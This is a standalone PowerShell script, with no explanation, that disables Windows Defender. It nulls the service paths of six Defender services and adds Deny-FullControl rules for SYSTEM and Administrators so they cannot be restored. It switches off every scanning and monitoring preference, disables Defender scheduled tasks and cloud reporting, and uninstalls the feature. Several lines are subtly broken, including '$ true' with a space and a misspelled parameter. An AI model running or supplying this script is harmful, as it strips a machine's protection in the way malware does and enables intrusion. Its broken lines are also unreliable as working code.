$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend"
Set-ItemProperty -Path  $RegistryPath -Name ImagePath -Value null
$key = Get-Item -Path $registryPath
$users = @("TrustedInstaller", "ALL APPLICATION PACKAGES", "CREATOR OWNER", "SYSTEM", "Administrators", "Users")
foreach ($user in $users) {
    $acl = Get-Acl -Path $registryPath
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule($user, "FullControl", "Deny")
    $acl.AddAccessRule($rule)
    Set-Acl -Path $registryPath -AclObject $acl
}


$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Sense"
Set-ItemProperty -Path  $RegistryPath -Name ImagePath -Value null
$key = Get-Item -Path $registryPath
$users = @("TrustedInstaller", "ALL APPLICATION PACKAGES", "CREATOR OWNER", "SYSTEM", "Administrators", "Users")
foreach ($user in $users) {
    $acl = Get-Acl -Path $registryPath
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule($user, "FullControl", "Deny")
    $acl.AddAccessRule($rule)
    Set-Acl -Path $registryPath -AclObject $acl
}

$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter"
Set-ItemProperty -Path  $RegistryPath -Name ImagePath -Value null
$key = Get-Item -Path $registryPath
$users = @("TrustedInstaller", "ALL APPLICATION PACKAGES", "CREATOR OWNER", "SYSTEM", "Administrators", "Users")
foreach ($user in $users) {
    $acl = Get-Acl -Path $registryPath
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule($user, "FullControl", "Deny")
    $acl.AddAccessRule($rule)
    Set-Acl -Path $registryPath -AclObject $acl
}

$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisDrv"
Set-ItemProperty -Path  $RegistryPath -Name ImagePath -Value null
$key = Get-Item -Path $registryPath
$users = @("TrustedInstaller", "ALL APPLICATION PACKAGES", "CREATOR OWNER", "SYSTEM", "Administrators", "Users")
foreach ($user in $users) {
    $acl = Get-Acl -Path $registryPath
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule($user, "FullControl", "Deny")
    $acl.AddAccessRule($rule)
    Set-Acl -Path $registryPath -AclObject $acl
}

$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc"
Set-ItemProperty -Path  $RegistryPath -Name ImagePath -Value null
$key = Get-Item -Path $registryPath
$users = @("TrustedInstaller", "ALL APPLICATION PACKAGES", "CREATOR OWNER", "SYSTEM", "Administrators", "Users")
foreach ($user in $users) {
    $acl = Get-Acl -Path $registryPath
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule($user, "FullControl", "Deny")
    $acl.AddAccessRule($rule)
    Set-Acl -Path $registryPath -AclObject $acl
}

$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WdBoot"
Set-ItemProperty -Path  $RegistryPath -Name ImagePath -Value null
$key = Get-Item -Path $registryPath
$users = @("TrustedInstaller", "ALL APPLICATION PACKAGES", "CREATOR OWNER", "SYSTEM", "Administrators", "Users")
foreach ($user in $users) {
    $acl = Get-Acl -Path $registryPath
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule($user, "FullControl", "Deny")
    $acl.AddAccessRule($rule)
    Set-Acl -Path $registryPath -AclObject $acl
}




Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue


Set-MpPreference -DisableRealtimeMonitoring $true

New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

Get-ScheduledTask "Windows Defender Cache Maintenance" | Disable-ScheduledTask
Get-ScheduledTask "Windows Defender Cleanup" | Disable-ScheduledTask
Get-ScheduledTask "Windows Defender Scheduled Scan" | Disable-ScheduledTask
Get-ScheduledTask "Windows Defender Verification" | Disable-ScheduledTask

Set-MpPreference -DisableRealtimeMonitoring $ true -DisableAutoExclusions $ true -DisablePrivacyMode $ true -DisableBehaviorMonitoring $ true -DisableIntrusionPreventionSystem $ true -DisableIOAVProtection $ true -DisableScriptScanning $ true -DisableArchiveScanning $ true -DisableCatchupFullScan $ true -DisableCatchupQuickScan $ true -DisableEmailScanning $ true -DisableRemovableDriveScanning $ true -DisableRestorePoint $ true -DisableScannedMappedNetworkDrivesForFullScan $ true -DisableScanningNetworkFiles $ true -DisableBlockAtFirstSeen $ true

Set-MpPreference -MAPSReporting 0

Uninstall-WindowsFeature -Name Windows-Defender


Set-MpPreference -DisableRealtimeMonitoring $true


